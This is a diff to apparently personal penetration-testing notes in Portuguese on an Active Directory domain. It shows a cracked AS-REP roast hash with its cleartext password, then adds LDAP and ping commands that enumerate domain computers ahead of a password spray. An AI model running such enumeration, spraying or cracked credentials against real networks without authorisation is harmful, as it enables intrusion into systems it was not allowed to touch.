@@ -56,3 +56,16 @@ $krb5asrep$23$tel_support01@TELECORE.AD:#T3l3phon3!
 
 1 password hash cracked, 0 left
 #+end_src
+
+* password spray
+com estas credenciais é preciso verificar onde elas são válidas, e quais máquinas elas são aceitas.
+
+pegar os ~computers~ do domain controller via LDAP -->
+#+begin_src sh
+ldapsearch -x -H ldap://10.5.2.2 -b "DC=telecore,DC=ad" "objectClass=computer" dNSHostName | grep -Ei "^dnshostname" | awk '{print $2}' > computers.txt
+#+end_src
+
+pegando o IP destas máquinas -->
+#+begin_src sh
+for ip in $(cat computers.txt);do ping -c 1 $ip;done | grep PING | awk '{print $2 " -- " $3}' | tr "()" " "
+#+end_src
